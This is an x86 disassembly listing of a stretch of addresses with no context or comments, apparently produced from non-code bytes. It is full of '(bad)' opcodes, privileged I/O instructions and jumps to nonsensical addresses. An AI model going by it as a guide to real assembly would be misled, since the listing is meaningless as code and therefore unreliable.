  41cb71:	ins    BYTE PTR es:[edi],dx
  41cb72:	int    0x4d
  41cb74:	push   eax
  41cb75:	push   esi
  41cb76:	ret    
  41cb77:	add    eax,0xae0ad4fd
  41cb7c:	cld    
  41cb7d:	mov    esp,0x3c19683e
  41cb82:	aaa    
  41cb83:	push   ebx
  41cb84:	test   BYTE PTR [ecx],ch
  41cb86:	pop    ss
  41cb87:	jl     0x41cba1
  41cb89:	call   0xa4cacb9c
  41cb8e:	retf   0x166
  41cb91:	jb     0x41cbf0
  41cb93:	std    
  41cb94:	gs push 0x45
  41cb97:	add    eax,0x9e8dde08
  41cb9c:	add    BYTE PTR [eax],al
  41cb9e:	add    DWORD PTR fs:[eax-0x1c],ebp
  41cba2:	fiadd  DWORD PTR [eax-0x3]
  41cba5:	dec    cl
  41cba7:	mov    al,0xe7
  41cba9:	jg     0x41cbde
  41cbab:	add    al,BYTE PTR [eax]
  41cbad:	sub    DWORD PTR [ecx+edi*4],0x70
  41cbb1:	add    dl,BYTE PTR [edi]
  41cbb3:	mov    esp,0x8933c080
  41cbb8:	in     eax,0x0
	...
  41cbd6:	add    BYTE PTR [eax],al
  41cbd8:	xor    al,0x1
  41cbda:	aaa    
  41cbdb:	inc    ebp
  41cbdc:	and    BYTE PTR [eax],cl
  41cbde:	jg     0x41cbc0
  41cbe0:	and    al,0x1
  41cbe2:	add    BYTE PTR [ebx+0x348a503f],cl
  41cbe8:	stos   BYTE PTR es:[edi],al
  41cbe9:	and    bh,BYTE PTR [esi+0x4]
  41cbec:	out    0xf6,eax
  41cbee:	(bad)  
  41cbef:	jl     0x41cb89
  41cbf1:	push   es
  41cbf2:	test   ah,cl
  41cbf4:	hlt    
  41cbf5:	add    BYTE PTR [eax],al
  41cbf7:	mov    ebp,DWORD PTR [ebx-0x1adc861d]
  41cbfd:	add    BYTE PTR [ebp-0x402a4bbb],al
  41cc03:	(bad)  
  41cc06:	add    BYTE PTR [eax],al
  41cc08:	mov    ah,0xb7
  41cc0a:	xor    eax,0x4d50d7ff
  41cc0f:	(bad)  
  41cc10:	mov    ecx,0xb440133c
  41cc15:	add    DWORD PTR [esi],0x3
  41cc18:	imul   edx,DWORD PTR [eax-0x80],0x70b7a0c4
  41cc1f:	hlt    
  41cc20:	rol    DWORD PTR [ebp+esi*8+0x50],cl
  41cc24:	inc    ebx
  41cc25:	gs dec ecx
  41cc27:	push   ss
  41cc28:	mov    ah,0x0
  41cc2a:	xchg   DWORD PTR [esi+0x68],eax
  41cc2d:	add    DWORD PTR [edi+0x14],0x5f
  41cc31:	enter  0xc47e,0xd
  41cc35:	pop    ebx
  41cc36:	mov    dl,0x88
  41cc38:	(bad)  
  41cc39:	push   esi
  41cc3a:	add    al,0xc8
	...
  41cc58:	add    BYTE PTR [eax],al
  41cc5a:	xchg   BYTE PTR [esp+ecx*4+0x73],ah
  41cc5e:	std    
  41cc5f:	imul   edi,DWORD PTR [edi],0xb252d001
  41cc65:	dec    edi
  41cc66:	inc    edx
  41cc67:	sub    eax,ebp
  41cc69:	adc    eax,0xc48466cd
  41cc6e:	add    DWORD PTR [esi],esi
  41cc70:	aam    0xf
  41cc72:	xor    eax,0x22ff2319
  41cc77:	(bad)  
  41cc79:	je     0xc907bc40
  41cc7f:	xchg   ebp,eax
  41cc80:	add    ch,cl
  41cc82:	push   0xffffffe6
  41cc84:	aad    0xf7
  41cc86:	or     eax,0x13891f0c
  41cc8b:	into   
  41cc8c:	(bad)  
  41cc8d:	add    eax,DWORD PTR [esi-0x1ad70bf2]
  41cc93:	adc    al,BYTE PTR [ebx]
  41cc95:	enter  0x813c,0x75
  41cc99:	and    DWORD PTR [ecx+ebp*2],ecx
  41cc9c:	mov    al,BYTE PTR [ebx-0x2b]
  41cc9f:	fadd   QWORD PTR [eax+0x74]
  41cca2:	or     dh,dl
  41cca4:	mov    bl,al
  41cca6:	mov    ch,0x94
  41cca8:	popa   
  41cca9:	std    
  41ccaa:	mov    edx,0x86f3bdd0
  41ccaf:	loope  0x41cc3c
  41ccb1:	pop    ebx
  41ccb2:	add    eax,0x188903de
  41ccb7:	dec    ebp
  41ccb8:	xchg   BYTE PTR [ebp+edx*8+0x67],cl
  41ccbc:	imul   eax,DWORD PTR [ebp+0x0],0x0
	...
  41ccdb:	add    bh,ch
  41ccdd:	add    DWORD PTR [si-0x6ab3],eax
  41cce2:	test   BYTE PTR [eax+0x5504660b],0x7a
  41cce9:	add    BYTE PTR [ebx+ebx*2-0x380bad23],bl
  41ccf0:	add    al,al
  41ccf2:	out    0x4,al
  41ccf4:	and    al,0x87
  41ccf6:	in     eax,0x84
  41ccf8:	push   ecx
  41ccf9:	add    al,0x2d
  41ccfb:	dec    DWORD PTR [ecx]
  41ccfd:	push   es
  41ccfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccff:	mov    al,BYTE PTR [ebx+edx*2]
  41cd02:	jl     0x41cd5f
  41cd04:	xor    eax,0xd02c960
  41cd09:	xchg   BYTE PTR [edi+edx*2],ch
  41cd0c:	shl    BYTE PTR [ecx-0x13b0b2bf],1
  41cd12:	out    0xb0,al
  41cd14:	xchg   ebp,eax
  41cd15:	fs push 0x68
  41cd18:	in     eax,dx
  41cd19:	scas   al,BYTE PTR es:[edi]
  41cd1a:	sbb    al,0x13
  41cd1c:	dec    ebp
  41cd1d:	stos   DWORD PTR es:[edi],eax
  41cd1e:	jno    0x41ccf9
  41cd20:	adc    cl,BYTE PTR [ecx-0x43759fd4]
  41cd26:	mov    esi,0xf5f4501d
  41cd2b:	jge    0x41cd09
  41cd2d:	add    bh,ah
  41cd2f:	add    edx,DWORD PTR [edx+0x588b82bc]
  41cd35:	clc    
  41cd36:	jmp    0xa250b40b
  41cd3b:	push   edi
  41cd3c:	pop    ebx
  41cd3d:	or     BYTE PTR [edx-0x52],dh
	...
  41cd5c:	add    BYTE PTR [eax],al
  41cd5e:	push   ss
  41cd5f:	out    0xde,al
  41cd61:	scas   al,BYTE PTR es:[edi]
  41cd62:	stos   BYTE PTR es:[edi],al
  41cd63:	mov    bh,BYTE PTR [ebx+0x57]
  41cd66:	mov    eax,0x8907277b
  41cd6b:	jb     0x41cd55
  41cd6d:	add    ecx,DWORD PTR ds:0x940bdd53
  41cd73:	test   eax,0xab0ae9da
  41cd78:	dec    esi
  41cd79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd7a:	mov    eax,ds:0x4d803e52
  41cd7f:	add    al,BYTE PTR [eax]
  41cd81:	ins    DWORD PTR es:[edi],dx
  41cd82:	nop
  41cd83:	push   edx
  41cd84:	std    
  41cd85:	jmp    0xc8558711
  41cd8a:	mov    ch,0x62
  41cd8c:	pop    ds
  41cd8d:	mov    esp,0xf95e88da
  41cd92:	xchg   ecx,eax
  41cd93:	mov    esi,0xf9b96afb
  41cd98:	or     al,0x6b
  41cd9a:	and    al,BYTE PTR [eax]
  41cd9c:	add    cl,ch
  41cd9e:	xchg   edi,eax
  41cd9f:	add    BYTE PTR [ecx-0x7dfcbf0f],al
  41cda5:	pop    ecx
  41cda6:	adc    DWORD PTR [eax],eax
  41cda8:	add    BYTE PTR [edx],ah
  41cdaa:	dec    esp
  41cdab:	push   esi
  41cdac:	or     eax,0xffffab66
  41cdb1:	call   0xe58b5ac1
  41cdb6:	enter  0x1492,0x3d
  41cdba:	and    al,0xd2
  41cdbc:	fsubrp st(5),st
  41cdbe:	adc    ecx,DWORD PTR [edx+0xbec7]
	...
  41cde0:	inc    ecx
  41cde1:	test   esi,0x8168716a
  41cde7:	test   al,0x2e
  41cde9:	add    esi,DWORD PTR [ebp-0x203a6650]
  41cdef:	push   0x46
  41cdf1:	add    dh,BYTE PTR [esi+0x3b]
  41cdf4:	mov    es,WORD PTR [eax-0x6]
  41cdf7:	ror    bh,0x7
  41cdfa:	jae    0x41ce2f
  41cdfc:	(bad)  
  41cdfd:	retf   
  41cdfe:	adc    esp,DWORD PTR [edi+ecx*8-0x5]
  41ce02:	cld    
  41ce03:	idiv   BYTE PTR [esi+0x7e617b86]
  41ce09:	pop    ecx
  41ce0a:	add    DWORD PTR [ecx],esi
  41ce0c:	push   cs
  41ce0d:	add    BYTE PTR [ecx+0x2fd40951],al
  41ce13:	bound  ebx,QWORD PTR [ebp-0x7]
  41ce16:	mov    al,BYTE PTR [eax]
  41ce18:	pop    ecx
  41ce19:	ror    DWORD PTR [ebp+ecx*4-0x47],0xad
  41ce1e:	dec    esp
  41ce1f:	inc    ecx
  41ce21:	fld    QWORD PTR [esi+0x70aa94cb]
  41ce27:	clc    
  41ce28:	(bad)  
  41ce29:	aas    
  41ce2a:	stc    
  41ce2b:	call   0x3c86cc
  41ce30:	lock mov esp,0x400b0373
  41ce36:	loope  0x41ce37
  41ce38:	shl    DWORD PTR [edi+esi*4-0x34c00],1
  41ce3f:	out    0x17,eax
  41ce41:	sbb    al,0xfd
  41ce43:	inc    DWORD PTR [eax]
	...
  41ce61:	add    BYTE PTR [edi+0x278b0537],ch
  41ce67:	es inc ecx
  41ce69:	cld    
  41ce6a:	aaa    
  41ce6b:	adc    eax,0x52387d7f
  41ce70:	or     al,0x83
  41ce72:	shr    DWORD PTR [edx+0x28a7fffa],1
  41ce78:	icebp  
  41ce79:	add    BYTE PTR [edx+0x2],al
  41ce7c:	sti    
  41ce7d:	aaa    
  41ce7e:	outs   dx,DWORD PTR ds:[esi]
  41ce7f:	xchg   ebx,eax
  41ce80:	add    DWORD PTR [eax-0x33],ebp
  41ce83:	test   al,0xff
  41ce85:	call   FWORD PTR [ecx+edi*4-0x780bfefe]
  41ce8c:	fadd   DWORD PTR [ebp-0xe9d061]
  41ce92:	add    DWORD PTR [eax+0x665475fa],esi
  41ce98:	std    
  41ce99:	push   edx
  41ce9a:	sbb    al,0xc5
  41ce9c:	(bad)  
  41ce9d:	push   DWORD PTR [esp+eiz*8-0x35a664f]
  41cea4:	dec    esi
  41cea5:	call   0x3eeb39
  41ceaa:	dec    ebx
  41ceab:	inc    ecx
  41ceac:	in     eax,dx
  41cead:	call   0xff62a4bf
  41ceb2:	call   0x70e3:0x3fefda8
  41ceb9:	add    BYTE PTR ds:0x56efe967,cl
  41cebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cec0:	add    ebp,edi
  41cec2:	and    BYTE PTR [edi],ch
  41cec4:	out    dx,eax
  41cec5:	aas    
	...
  41cee2:	add    BYTE PTR [eax],al
  41cee4:	or     eax,0x6ae8c0ef
  41cee9:	icebp  
  41ceea:	xchg   BYTE PTR [esi+0x11],al
  41ceed:	fidiv  WORD PTR [ebp+0x559b8407]
  41cef3:	adc    DWORD PTR [ebp+0x4a],0x659667cf
  41cefa:	cmp    al,0x11
  41cefd:	aad    0xe1
  41ceff:	cmp    al,dl
  41cf01:	(bad)  
  41cf02:	int3   
  41cf03:	pop    ebx
  41cf04:	xchg   BYTE PTR ds:0x664cf500,cl
  41cf0a:	add    DWORD PTR [eax],eax
  41cf0c:	in     eax,dx
  41cf0d:	mov    dl,0xbf
  41cf0f:	adc    BYTE PTR ds:0x1b3ccb32,0xa7
  41cf16:	add    dh,BYTE PTR [edi+eax*2-0x2e]
  41cf1a:	add    eax,0x41ad10c
  41cf1f:	add    ebp,eax
  41cf21:	fisttp WORD PTR [eax]
  41cf23:	int3   
  41cf24:	dec    esi
  41cf25:	pop    ecx
  41cf26:	imul   esi,DWORD PTR [ebp+0x2d],0xcd840158
  41cf2d:	in     eax,dx
  41cf2e:	and    ch,bh
  41cf30:	push   ds
  41cf31:	loop   0x41cf38
  41cf33:	or     cl,al
  41cf35:	sbb    al,BYTE PTR [ecx+eax*1]
  41cf38:	sbb    BYTE PTR [ebp+0x45],bl
  41cf3b:	inc    ecx
  41cf3c:	or     eax,0x20fcb0ea
  41cf41:	in     eax,dx
  41cf42:	in     eax,dx
  41cf43:	aas    
  41cf44:	or     eax,0x7200
	...
  41cf65:	add    BYTE PTR [esp+eax*2-0x3f1fd15],cl
  41cf6c:	and    al,al
  41cf6e:	call   0x1003:0x840bcc7a
  41cf75:	mov    edi,0x801f0386
  41cf7a:	push   es
  41cf7b:	dec    esp
  41cf7c:	jecxz  0x41cf4e
  41cf7e:	mov    ds:0xcc4836d8,al
  41cf83:	jmp    DWORD PTR ds:0xa6f206ee
  41cf89:	add    esp,DWORD PTR [eax-0x3b]
  41cf8c:	inc    BYTE PTR [edi-0x4195a832]
  41cf92:	callw  0x8c57
  41cf96:	jmp    FWORD PTR es:[eax+0x13]
  41cf9a:	inc    ebx
  41cf9b:	dec    edi
  41cf9c:	test   BYTE PTR [edi],0x4d
  41cf9f:	or     esp,DWORD PTR [edi+ebx*2-0x4d591530]
  41cfa6:	and    DWORD PTR [eax],ebp
  41cfa8:	inc    edx
  41cfa9:	cmp    eax,0xb9e7044f
  41cfae:	test   DWORD PTR [eax-0x32],edx
  41cfb1:	fimul  DWORD PTR [edx]
  41cfb3:	pop    eax
  41cfb4:	mov    dl,0x24
  41cfb6:	or     cl,BYTE PTR [edi-0x42]
  41cfb9:	ficom  DWORD PTR [edx]
  41cfbb:	pop    eax
  41cfbc:	stos   BYTE PTR es:[edi],al
  41cfbd:	and    al,0xfa
  41cfbf:	dec    esi
  41cfc0:	scas   al,BYTE PTR es:[edi]
  41cfc1:	ficom  DWORD PTR [esi]
  41cfc3:	pop    eax
  41cfc4:	bound  esp,QWORD PTR [edx+ebp*8]
  41cfc7:	dec    esi
  41cfc8:	sahf   
  41cfc9:	fiadd  DWORD PTR [eax]
	...
  41cfe7:	add    BYTE PTR [esi],dh
  41cfe9:	pop    eax
  41cfea:	pop    edx
  41cfeb:	and    al,0xda
  41cfed:	dec    esi
  41cfee:	mov    ds,edx
  41cff0:	and    bl,BYTE PTR [eax+0x52]
  41cff3:	and    al,0xca
  41cff5:	dec    esi
  41cff6:	jle    0x41cfd2
  41cff8:	(bad)  
  41cff9:	push   edi
  41cffa:	add    BYTE PTR [edx-0xf],cl
  41cffd:	dec    esi
  41cffe:	std    
  41cfff:	(bad)  
  41d000:	xlat   BYTE PTR ds:[ebx]
  41d001:	push   cs
  41d002:	sbb    DWORD PTR [edi-0x3b],0xfffffff9
  41d006:	cld    
  41d007:	pop    ss
  41d008:	inc    ecx
  41d009:	jae    0x41d02b
  41d00b:	call   0x5f29861e
  41d010:	jmp    0xd3e9cd63
  41d015:	dec    esp
  41d016:	jbe    0x41cffd
  41d018:	out    0x82,al
  41d01a:	and    al,ch
  41d01c:	push   cs
  41d01d:	dec    ebp
  41d01e:	jbe    0x41d001
  41d020:	(bad)  
  41d021:	retf   0xe81f
  41d024:	push   cs
  41d025:	dec    ebp
  41d026:	jbe    0x41d021
  41d028:	(bad)  
  41d029:	rcr    BYTE PTR [edi],cl
  41d02b:	call   0x6297113e
  41d030:	rol    DWORD PTR [edx-0x4bbb8203],0x88
  41d037:	mul    BYTE PTR [ebx+0x54]
  41d03a:	sbb    dl,ch
  41d03c:	bound  esp,QWORD PTR [edx]
  41d03e:	or     al,0x6a
  41d040:	scas   eax,DWORD PTR es:[edi]
  41d041:	out    0xe7,eax
  41d043:	mov    bh,0xbf
  41d045:	dec    esp
  41d046:	std    
  41d047:	cs inc esp
  41d049:	push   ecx
  41d04a:	pop    esi
  41d04b:	add    BYTE PTR ss:[eax],al
	...
  41d06a:	mov    eax,0xee81fbe
  41d06f:	mov    bl,0x88
  41d071:	aad    0x93
  41d073:	fs clc 
  41d075:	jb     0x41d04c
  41d077:	add    eax,0xb0aac581
  41d07c:	push   ebp
  41d07d:	push   ss
  41d07e:	pop    esi
  41d07f:	rol    BYTE PTR [ebx],1
  41d081:	je     0x41d045
  41d083:	and    DWORD PTR [eax],edi
  41d085:	xchg   ecx,eax
  41d086:	shr    DWORD PTR [eax],1
  41d088:	std    
  41d089:	xchg   esi,eax
  41d08a:	xchg   edx,eax
  41d08b:	inc    eax
  41d08c:	or     eax,0xfd4d6265
  41d091:	add    BYTE PTR [esi+esi*8+0x456b66d6],dh
  41d098:	and    DWORD PTR [esp+eiz*4],edx
  41d09b:	add    al,0x88
  41d09d:	pop    esp
  41d09e:	enter  0xe556,0x1f
  41d0a2:	leave  
  41d0a3:	add    al,0x0
  41d0a5:	mov    eax,DWORD PTR [edx+eax*1-0x42]
  41d0a9:	inc    esp
  41d0aa:	or     BYTE PTR [ebp+0xc],dl
  41d0ad:	mov    esi,0x53140568
  41d0b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0b3:	xchg   esi,eax
  41d0b4:	dec    ebp
  41d0b5:	push   esi
  41d0b6:	inc    ebx
  41d0b7:	dec    eax
  41d0b8:	test   eax,0x5601a415
  41d0bd:	mov    DWORD PTR [eax+0x2fe81c25],ebp
  41d0c3:	push   edx
  41d0c4:	(bad)  
  41d0c5:	jmp    FWORD PTR [ebp-0x63]
  41d0c8:	and    DWORD PTR [eax],ebx
  41d0ca:	jae    0x41d051
  41d0cc:	add    DWORD PTR ds:[eax],eax
	...
  41d0eb:	add    BYTE PTR [ecx+eax*1+0x4f],ah
  41d0ef:	push   ebx
  41d0f0:	sahf   
  41d0f1:	push   es
  41d0f2:	dec    edi
  41d0f3:	push   ebx
  41d0f4:	inc    ebx
  41d0f5:	and    DWORD PTR ss:[ebx+eax*2+0x36],edx
  41d0fa:	and    DWORD PTR [ebx+eiz*1+0x36],ecx
  41d0fe:	and    DWORD PTR [ebx+esi*1],esi
  41d101:	push   ebp
  41d102:	rcl    DWORD PTR ds:0x448503f4,0x8
  41d109:	sbb    BYTE PTR [edi],dh
  41d10b:	ret    
  41d10c:	xor    eax,DWORD PTR [ebp+0xf40110]
  41d112:	xchg   DWORD PTR [ebp-0x4],eax
  41d115:	retf   
  41d116:	(bad)  
  41d117:	jg     0x41d155
  41d119:	pop    esp
  41d11a:	(bad)  
  41d11b:	mov    ebp,0x3d29bc
  41d120:	or     BYTE PTR ds:0x43fb00be,al
  41d126:	std    
  41d127:	xor    cl,BYTE PTR ds:0x297c84a0
  41d12d:	sbb    DWORD PTR [esi],eax
  41d12f:	push   ecx
  41d130:	sbb    ch,BYTE PTR [eax+eax*2+0x4778c47]
  41d137:	add    BYTE PTR [ebp+0xdc78256],cl
  41d13d:	(bad)  
  41d13e:	inc    DWORD PTR [ebx+0x70508a3c]
  41d144:	adc    eax,0x4d765d2f
  41d149:	push   edi
  41d14a:	push   eax
  41d14b:	je     0x41d136
  41d14d:	push   0xffffffb7
  41d14f:	cld    
	...
  41d16c:	add    BYTE PTR [eax],al
  41d16e:	add    ebx,edi
  41d170:	ret    
  41d171:	cld    
  41d172:	sbb    BYTE PTR [edi-0xb],bh
  41d175:	aas    
  41d176:	or     eax,0x7e3953e2
  41d17b:	sub    eax,0x570db685
  41d180:	add    DWORD PTR [edx+0x6],ebp
  41d183:	fmul   st(7),st
  41d185:	and    eax,ebp
  41d187:	mov    ds,WORD PTR [ecx-0x79]
  41d18a:	test   al,0x56
  41d18c:	add    DWORD PTR [eax+0xd],ebp
  41d18f:	push   edi
  41d190:	add    DWORD PTR [eax-0x3a83b249],esp
  41d196:	(bad)  [eax+edx*2+0x13]
  41d19a:	jns    0x41d1cf
  41d19c:	sar    edi,0xb4
  41d19f:	add    BYTE PTR [ebp+0x7c],bh
  41d1a2:	jmp    0xaa297db5
  41d1a7:	jnp    0x41d1aa
  41d1a9:	add    BYTE PTR [esi+0x1288fbbb],al
  41d1af:	add    BYTE PTR [edi+ebx*1+0x7050557b],ch
  41d1b6:	sbb    esp,esp
  41d1b8:	les    esp,FWORD PTR [ebx]
  41d1ba:	inc    ebp
  41d1bb:	jmp    0x73163c
  41d1c0:	retf   
  41d1c1:	mov    bl,0xea
  41d1c3:	enter  0x2ed,0xd
  41d1c7:	jg     0x41d174
  41d1c9:	dec    DWORD PTR [edi+0x32ed0d40]
  41d1cf:	add    bh,ah
  41d1d1:	add    eax,DWORD PTR [eax]
	...
  41d1ef:	add    BYTE PTR [ebp-0x2a],ch
  41d1f2:	jge    0x41d244
  41d1f4:	inc    ecx
  41d1f5:	and    al,0xcb
  41d1f7:	mov    ecx,0xf632f5b1
  41d1fc:	jmp    0x4eeb:0xeed765ff
  41d203:	stc    
  41d204:	stc    
  41d205:	add    bh,ah
  41d207:	jl     0x41d211
  41d209:	dec    ebx
  41d20a:	xlat   BYTE PTR ds:[ebx]
  41d20b:	sbb    ecx,DWORD PTR [eax-0x224af530]
  41d211:	mov    cl,0x3d
  41d213:	imul   BYTE PTR [edx-0x73fc590b]
  41d219:	dec    eax
  41d21a:	call   0x73f0eef5
  41d21f:	(bad)  
  41d220:	cs sbb al,0xb7
  41d223:	jle    0x41d1f6
  41d225:	and    edi,DWORD PTR [edi-0x1911154d]
  41d22b:	add    ebp,ebp
  41d22d:	mov    cl,0x2d
  41d22f:	(bad)  
  41d230:	out    dx,al
  41d231:	or     esp,ebx
  41d233:	add    ecx,DWORD PTR ds:0xeeaf6000
  41d239:	adc    ebp,esi
  41d23b:	cmc    
  41d23c:	push   0xfffffff5
  41d23e:	es add al,0x8c
  41d241:	dec    eax
  41d242:	call   0x53c2d71f
  41d247:	sub    ch,ch
  41d249:	aaa    
  41d24a:	out    0x3,eax
  41d24c:	or     eax,0x1b62dd4
  41d251:	cmc    
  41d252:	mov    ?,ecx
	...
  41d270:	add    BYTE PTR [eax],al
  41d272:	cmp    al,BYTE PTR [eax]
  41d274:	add    BYTE PTR [esi-0x51dbe12b],dh
  41d27a:	in     al,0xa2
  41d27c:	adc    ebp,DWORD PTR [ecx]
  41d27e:	or     DWORD PTR [ebp+0x74],ecx
  41d281:	(bad)
  41d284:	adc    eax,DWORD PTR [ecx-0x2c]
  41d287:	or     al,BYTE PTR [eax]
  41d289:	(bad)  
  41d28a:	aad    0x1e
  41d28c:	adc    DWORD PTR [ecx-0x23],ebp
  41d28f:	push   ds
  41d290:	adc    ebx,ebp
  41d292:	mov    ebx,0x42778180
  41d297:	dec    ebp
  41d298:	std    
  41d299:	cmc    
  41d29a:	repnz adc ebp,eax
  41d29d:	xor    BYTE PTR [ebx-0x4aa102b7],0x1e
  41d2a4:	cmp    BYTE PTR [ecx+0x1f],al
  41d2a7:	jmp    0x2930:0xacbbe8fe
  41d2ae:	mov    dh,0x77
  41d2b0:	jecxz  0x41d24e
  41d2b2:	int3   
  41d2b3:	add    eax,DWORD PTR [eax]
  41d2b5:	ss push ebp
  41d2b7:	push   ds
  41d2b8:	xor    al,0x41
  41d2ba:	pop    ebx
  41d2bb:	in     al,dx
  41d2bc:	(bad)  
  41d2bd:	call   0xe165a695
  41d2c2:	mov    dh,0xce
  41d2c4:	sbb    eax,0x1bd60ee8
  41d2c9:	pusha  
  41d2ca:	bound  eax,QWORD PTR [edx]
  41d2cc:	mov    eax,DWORD PTR [ebp+0x11580fea]
  41d2d2:	dec    ebx
  41d2d3:	sahf   
  41d2d4:	add    cl,ch
	...
  41d2f2:	add    BYTE PTR [eax],al
  41d2f4:	mov    cl,0xab
  41d2f6:	and    ecx,ebp
  41d2f8:	(bad)  
  41d2f9:	test   eax,0xff471569
  41d2fe:	mov    ah,BYTE PTR ds:0x62501fe5
  41d304:	dec    edx
  41d305:	push   ds
  41d306:	and    BYTE PTR [esi],dh
  41d308:	imul   ebx,DWORD PTR [edx+0x5],0x52fdf500
  41d30f:	mov    DWORD PTR [eax],esi
  41d311:	sbb    BYTE PTR [eax],ch
  41d313:	call   0x402d3f
  41d318:	outs   dx,DWORD PTR ds:[esi]
  41d319:	inc    ecx
  41d31a:	and    DWORD PTR [edi+esi*2],esp
  41d31d:	mov    ch,0xfa
  41d31f:	je     0x41d30d
  41d321:	out    dx,al
  41d322:	cli    
  41d323:	cmp    esp,DWORD PTR [edi-0xf74d9cd]
  41d329:	pop    ss
  41d32a:	sbb    BYTE PTR [ebp+0x183575b0],cl
  41d330:	ror    BYTE PTR [eax-0x4],0x30
  41d334:	cmp    ecx,DWORD PTR [eax-0x3f]
  41d337:	adc    dh,ah
  41d339:	add    edx,DWORD PTR [eax-0x75]
  41d33c:	jo     0x41d35f
  41d33e:	sbb    al,0xff
  41d340:	add    BYTE PTR [eax+ebp*8+0x55],bh
  41d344:	(bad)  
  41d345:	mov    ecx,0x21b08bfa
  41d34a:	and    al,0x47
  41d34c:	bsf    esi,DWORD PTR [ecx-0x29]
  41d350:	(bad)  
  41d351:	cmp    BYTE PTR [ecx],ah
  41d353:	sbb    ah,cl
  41d355:	pop    edx
  41d356:	sbb    eax,DWORD PTR [ecx]
	...
  41d374:	add    BYTE PTR [eax],al
  41d376:	je     0x41d2f8
  41d378:	inc    esp
  41d379:	and    al,0x8
  41d37b:	xchg   esp,eax
  41d37c:	mov    al,BYTE PTR [eax+edx*2+0x55]
  41d380:	dec    ebp
  41d381:	lea    esp,[eax-0x7dafcbdf]
  41d387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d388:	dec    ebx
  41d389:	je     0x41d3c0
  41d38b:	std    
  41d38c:	xchg   al,bh
  41d38e:	dec    edi
  41d38f:	mov    dh,0x70
  41d391:	xchg   DWORD PTR ds:0x3bfffc8d,ecx
  41d397:	xchg   ecx,eax
  41d398:	mov    ah,ch
  41d39a:	in     eax,0x8c
  41d39c:	push   eax
  41d39d:	push   esi
  41d39e:	popf   
  41d39f:	add    ch,BYTE PTR [edi]
  41d3a1:	fisttp DWORD PTR ds:0xa07aae0
  41d3a7:	test   al,0x7
  41d3a9:	std    
  41d3aa:	jge    0x41d3fb
  41d3ac:	pop    ecx
  41d3ad:	lods   al,BYTE PTR ds:[esi]
  41d3ae:	fimul  DWORD PTR [ecx+0x5b7a8b4b]
  41d3b4:	mov    cl,0x86
  41d3b6:	adc    ebx,DWORD PTR [edx+0x16ffc3f5]
  41d3bc:	add    al,0x87
  41d3be:	push   eax
  41d3bf:	imul   edi,DWORD PTR [ebp+0x43],0xffffffd1
  41d3c3:	push   es
  41d3c4:	mov    dh,0xe7
  41d3c6:	icebp  
  41d3c7:	outs   dx,BYTE PTR ds:[esi]
  41d3c8:	dec    ebx
  41d3c9:	std    
  41d3ca:	xchg   esi,eax
  41d3cb:	pop    eax
  41d3cc:	js     0x41d419
  41d3ce:	mov    ecx,0xf5feefce
  41d3d3:	xor    ch,dl
  41d3d5:	and    DWORD PTR [esi],edi
  41d3d7:	out    0xb2,al
  41d3d9:	add    BYTE PTR [bx+si],al
	...
  41d3f8:	imul   esi,DWORD PTR [esi],0xffffffc2
  41d3fb:	(bad)  
  41d3fc:	aas    
  41d3fd:	xchg   BYTE PTR [ebx+edx*1+0x71],cl
  41d401:	inc    esp
  41d402:	sar    edi,0x95
  41d405:	mov    eax,ds:0x8a4e38fd
  41d40a:	add    eax,0xf8ae0cb0
  41d40f:	cld    
  41d410:	cmp    edi,DWORD PTR [edi+0x570c1b81]
  41d416:	xadd   bl,al
  41d419:	cmp    eax,0xcdc0c13a
  41d41e:	pop    edi
  41d41f:	dec    edi
  41d420:	mov    esp,0xdf7e4d5
  41d425:	xchg   edx,eax
  41d426:	adc    ch,bh
  41d428:	add    al,0x84
  41d42a:	stc    
  41d42b:	jae    0x41d3f8
  41d42d:	jo     0x41d4a7
  41d42f:	xor    esp,DWORD PTR [ebp-0x66003ed5]
  41d435:	mov    ds:0xffba5049,eax
  41d43a:	jae    0x41d402
  41d43c:	push   ss
  41d43d:	scas   eax,DWORD PTR es:[edi]
  41d43e:	push   eax
  41d43f:	add    dl,BYTE PTR [eax]
  41d441:	rcr    dh,cl
  41d443:	dec    esp
  41d444:	jecxz  0x41d4c3
  41d446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d447:	(bad)  
  41d448:	cmp    al,0x7b
  41d44a:	sub    al,0x4c
  41d44c:	mov    es,WORD PTR [eax+0x33]
  41d44f:	sbb    DWORD PTR [eax+eax*2+0x582ed7e9],ecx
  41d456:	fucomi st,st(6)
  41d458:	jecxz  0x41d4a1
  41d45a:	jb     0x41d4a7
	...
  41d478:	add    BYTE PTR [eax],al
  41d47a:	mov    es,WORD PTR [edi+0x13]
  41d47d:	jmp    0xb4209209
  41d482:	leave  
  41d483:	int    0x8e
  41d485:	mov    ah,0x34
  41d487:	add    al,BYTE PTR [esi-0x6ab8ed2a]
  41d48d:	xchg   ch,cl
  41d48f:	int    0xde
  41d491:	mov    ah,0xb2
  41d493:	and    ah,cl
  41d495:	add    cl,BYTE PTR ds:0x85ad6613
  41d49b:	aas    
  41d49c:	mov    esi,0xe6fccf3a
  41d4a1:	mov    al,0xe1
  41d4a3:	inc    esi
  41d4a4:	shl    DWORD PTR [edi],cl
  41d4a6:	adc    DWORD PTR [edx],edx
  41d4a8:	and    bl,BYTE PTR [ebx-0x7a]
  41d4ab:	inc    edi
  41d4ac:	ds dec esp
  41d4ae:	test   BYTE PTR [eax+0x6c],cl
  41d4b1:	dec    esp
  41d4b2:	loope  0x41d4ce
  41d4b4:	xchg   ebp,eax
  41d4b5:	dec    esp
  41d4b6:	fstp   DWORD PTR [ebx]
  41d4b8:	sti    
  41d4b9:	pop    ebx
  41d4ba:	(bad)  
  41d4bb:	inc    esi
  41d4bc:	push   ds
  41d4bd:	dec    esp
  41d4be:	test   BYTE PTR [eax+0x6c],dl
  41d4c1:	push   ebp
  41d4c2:	shr    ebx,0xb4
  41d4c5:	mov    ah,0x41
  41d4c7:	in     eax,dx
  41d4c8:	inc    esi
  41d4c9:	icebp  
  41d4ca:	cli    
  41d4cb:	jmp    DWORD PTR [ebx+0x43]
  41d4ce:	mov    esi,0xeaf70001
  41d4d3:	lods   eax,DWORD PTR ds:[esi]
  41d4d4:	out    0xe,eax
  41d4d6:	xor    al,BYTE PTR [esi-0x3]
  41d4d9:	ds mov ecx,0xe81c2e
	...
